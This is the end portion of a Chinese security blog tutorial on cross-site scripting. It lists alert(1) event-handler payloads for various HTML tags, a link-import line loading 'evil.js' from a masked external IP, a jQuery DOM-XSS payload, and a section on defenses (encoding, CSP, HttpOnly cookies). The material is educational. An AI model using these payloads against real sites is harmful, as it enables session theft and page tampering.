+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>iframe onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="video-标签"><a href="#video-标签" class="headerlink" title="video 标签"></a><strong>video 标签</strong></h5><p><code>&lt;video&gt;</code> 标签定义视频，比如电影片段或其他视频流。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>video<span class="token operator">></span><span class="token operator">&lt;</span>source onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="audio-标签"><a href="#audio-标签" class="headerlink" title="audio 标签"></a><strong>audio 标签</strong></h5><p><code>&lt;audio&gt;</code> 标签定义声音，比如音乐或其他音频流。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>audio src<span class="token operator">=</span>x  onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="body-标签"><a href="#body-标签" class="headerlink" title="body 标签"></a><strong>body 标签</strong></h5><p><code>&lt;body&gt;</code> 标签定义文档的主体。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及 autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>bodyonscroll<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>input autofocus<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="textarea-标签"><a href="#textarea-标签" class="headerlink" title="textarea 标签"></a><strong>textarea 标签</strong></h5><p><code>&lt;textarea&gt;</code> 标签定义一个多行的文本输入控件。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>textarea onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> autofocus<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h5 id="keygen-标签"><a href="#keygen-标签" class="headerlink" title="keygen 标签"></a><strong>keygen 标签</strong></h5><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>keygen autofocus onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token comment">//仅限火狐</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h5 id="marquee-标签"><a href="#marquee-标签" class="headerlink" title="marquee 标签"></a><strong>marquee 标签</strong></h5><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>marquee onstart<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>marquee<span class="token operator">></span> <span class="token comment">//Chrome不行，火狐和IE都可以</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="isindex-标签"><a href="#isindex-标签" class="headerlink" title="isindex 标签"></a><strong>isindex 标签</strong></h5><p><code>&lt;link&gt;</code> 标签定义文档与外部资源的关系。在无 CSP 的情况下才可以使用：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>link rel<span class="token operator">=</span><span class="token keyword">import</span> href<span class="token operator">=</span><span class="token string">"http://47.xxx.xxx.72/evil.js"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="4-DOM-型-XSS-的利用"><a href="#4-DOM-型-XSS-的利用" class="headerlink" title="4. DOM 型 XSS 的利用"></a>4. DOM 型 XSS 的利用</h3><blockquote>
+<p>和前文说的一样，各种 js 中捣鼓</p>
+</blockquote>
+<h4 id="1-jQuery-中的-DOM-型-XSS"><a href="#1-jQuery-中的-DOM-型-XSS" class="headerlink" title="(1) jQuery 中的 DOM 型 XSS"></a>(1) jQuery 中的 DOM 型 XSS</h4><p>有问题的代码如下图所示</p>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/JQueryCode.png" class="">
+
+<p>若为进行任意过滤的时候 Payload</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h4 id="2-利用遗留下的测试代码"><a href="#2-利用遗留下的测试代码" class="headerlink" title="(2) 利用遗留下的测试代码"></a>(2) 利用遗留下的测试代码</h4><p>不多扯了，详见 <a target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/05/05/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-07-XSS/#toc-heading-6">WebGoat代码审计-07-XSS 利用测试代码触发 DOM 型 XSS)</a></p>
+<h2 id="0x06-XSS-的实战应用"><a href="#0x06-XSS-的实战应用" class="headerlink" title="0x06 XSS 的实战应用"></a>0x06 XSS 的实战应用</h2><p>几种钓鱼，和 getshell<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8459">XSS 实战攻击思路总结</a><br><a target="_blank" rel="noopener" href="https://www.hacking8.com/bug-web/Wordpress/Wordpress-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%E4%BB%8Exss%E5%88%B0getshell--xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8.html">从xss到getshell–xss的深层次利用与探讨</a></p>
+<h2 id="0x07-CSRF-和-XSS-的区别"><a href="#0x07-CSRF-和-XSS-的区别" class="headerlink" title="0x07 CSRF 和 XSS 的区别"></a>0x07 CSRF 和 XSS 的区别</h2><p>1、CSRF是跨站请求伪造;  XSS是跨域脚本攻击。<br>2、CSRF需要用户先登录网站A,获取cookie;  XSS不需要登录。<br>3、CSRF是利用网站A本身的漏洞,去请求网站A的api;  XSS是向网站A注入JS代码,然后执行JS里的代码,篡改网站A的内容。（XSS利用的是站点内的信任用户，而CSRF则是通过伪装来自受信任用户的请求来利用受信任的网站。你可以这么理解CSRF攻击：<strong>攻击者盗用了你的身份，以你的名义向第三方网站发送恶意请求</strong>。）</p>
+<h2 id="0x08-XSS-的防御"><a href="#0x08-XSS-的防御" class="headerlink" title="0x08 XSS 的防御"></a>0x08 XSS 的防御</h2><ul>
+<li>主要是两层：<br> 一： 对输出端的数据进行编码<br> 二:  验证输入</li>
+</ul>
+<p>目前时间 2022 年 5 月，感觉 XSS 不像之前那么泛滥了。</p>
+<h3 id="1-对输出端的数据进行编码"><a href="#1-对输出端的数据进行编码" class="headerlink" title="1. 对输出端的数据进行编码"></a>1. 对输出端的数据进行编码</h3><p>1）将一些字符进行转义，例如 <code>&lt;</code>，<code>&gt;</code> 进行转义<br>2）白名单，通过一些标签限制<br>3）不要把后端传进来的数据直接作为 HTML 渲染，进行处理</p>
+<h3 id="2-CSP-的应用"><a href="#2-CSP-的应用" class="headerlink" title="2. CSP 的应用"></a>2. CSP 的应用</h3><p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p>
+<ul>
+<li>禁止加载外域代码，防止复杂的攻击逻辑。</li>
+<li>禁止内联脚本执行。</li>
+<li>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</li>
+<li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li>
+</ul>
+<h3 id="3-其他安全措施"><a href="#3-其他安全措施" class="headerlink" title="3. 其他安全措施"></a>3. 其他安全措施</h3><ul>
+<li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。</li>
+<li>验证码：防止脚本冒充用户提交危险操作。</li>
+</ul>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">从0到1完全掌握XSS</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2022-05-05 21:02:23</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2022/05/05/从0到1完全掌握XSS/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">#web安全</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2022/05/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-08-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">WebGoat代码审计-08-不安全的反序列化</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2022/05/05/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-07-XSS/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">WebGoat代码审计-07-XSS</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
+              appKey: 'ermlV1eoB1YODT088EdXjo6C',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'just go go',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'Drunkbaby'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1-XSS"><span class="nav-text">从0到1完全掌握 XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E4%BB%80%E4%B9%88%E6%98%AF-XSS"><span class="nav-text">0x02 什么是 XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-XSS-%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="nav-text">0x03 XSS 的危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-XSS-%E7%AE%80%E5%8D%95%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%E4%B8%BE%E4%BE%8B"><span class="nav-text">0x04 XSS 简单应用场景举例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-XSS-%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5"><span class="nav-text">0x05 XSS 基本攻击手段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS-%E5%8F%8A%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5"><span class="nav-text">1. 反射型 XSS 及绕过手段</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS"><span class="nav-text">(1) 什么是反射型 XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%BD%93%E5%A4%A7%E5%A4%9A%E6%95%B0%E6%A0%87%E7%AD%BE%E8%A2%AB%E7%A6%81%E6%AD%A2%E6%97%B6%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-text">一、当大多数标签被禁止时的绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%BD%93%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E5%99%A8%E4%B8%8E-href-%E8%A2%AB%E7%A6%81%E7%94%A8%E6%97%B6%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-text">二、当事件处理器与 href 被禁用时的绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%AF%B9-script-%E8%BF%9B%E8%A1%8C%E9%97%AD%E5%90%88%E5%90%8E%E6%9E%84%E9%80%A0-Payload"><span class="nav-text">三、对 script 进行闭合后构造 Payload</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E7%BB%95%E8%BF%87-CSP-%E6%94%BB%E5%87%BB"><span class="nav-text">四、绕过 CSP 攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E4%B8%80-%E6%82%AC%E7%A9%BA%E6%A0%87%E8%AE%B0%E6%94%BB%E5%87%BB"><span class="nav-text">绕过方式一 悬空标记攻击</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E4%BA%8C-%E5%AF%B9-CSP-%E9%99%90%E5%88%B6%E4%B8%8D%E4%B8%A5%E6%A0%BC%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E6%94%BB%E5%87%BB"><span class="nav-text">绕过方式二  对 CSP 限制不严格的情况下攻击</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%AD%98%E5%82%A8%E5%9E%8B-XSS"><span class="nav-text">2. 存储型 XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-DOM-%E5%9E%8B-XSS-%E9%87%8D%E7%82%B9"><span class="nav-text">3. DOM 型 XSS(重点!)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E6%A0%87%E7%AD%BE%E4%B8%8E%E5%B1%9E%E6%80%A7"><span class="nav-text">一些常用的标签与属性</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#scirpt-%E6%A0%87%E7%AD%BE"><span class="nav-text">scirpt 标签</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#img-%E6%A0%87%E7%AD%BE"><span class="nav-text">img 标签</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#input-%E6%A0%87%E7%AD%BE"><span class="nav-text">input 标签</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#details-%E6%A0%87%E7%AD%BE"><span class="nav-text">details 标签</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#svg-%E6%A0%87%E7%AD%BE"><span class="nav-text">svg 标签</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#select-%E6%A0%87%E7%AD%BE"><span class="nav-text">select 标签</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#iframe-%E6%A0%87%E7%AD%BE"><span class="nav-text">iframe 标签</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#video-%E6%A0%87%E7%AD%BE"><span class="nav-text">video 标签</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#audio-%E6%A0%87%E7%AD%BE"><span class="nav-text">audio 标签</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#body-%E6%A0%87%E7%AD%BE"><span class="nav-text">body 标签</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#textarea-%E6%A0%87%E7%AD%BE"><span class="nav-text">textarea 标签</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#keygen-%E6%A0%87%E7%AD%BE"><span class="nav-text">keygen 标签</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#marquee-%E6%A0%87%E7%AD%BE"><span class="nav-text">marquee 标签</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#isindex-%E6%A0%87%E7%AD%BE"><span class="nav-text">isindex 标签</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-DOM-%E5%9E%8B-XSS-%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">4. DOM 型 XSS 的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-jQuery-%E4%B8%AD%E7%9A%84-DOM-%E5%9E%8B-XSS"><span class="nav-text">(1) jQuery 中的 DOM 型 XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8%E9%81%97%E7%95%99%E4%B8%8B%E7%9A%84%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="nav-text">(2) 利用遗留下的测试代码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-XSS-%E7%9A%84%E5%AE%9E%E6%88%98%E5%BA%94%E7%94%A8"><span class="nav-text">0x06 XSS 的实战应用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-CSRF-%E5%92%8C-XSS-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-text">0x07 CSRF 和 XSS 的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-XSS-%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="nav-text">0x08 XSS 的防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%AF%B9%E8%BE%93%E5%87%BA%E7%AB%AF%E7%9A%84%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81"><span class="nav-text">1. 对输出端的数据进行编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-CSP-%E7%9A%84%E5%BA%94%E7%94%A8"><span class="nav-text">2. CSP 的应用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%85%B6%E4%BB%96%E5%AE%89%E5%85%A8%E6%8E%AA%E6%96%BD"><span class="nav-text">3. 其他安全措施</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2021</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Drunkbaby</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
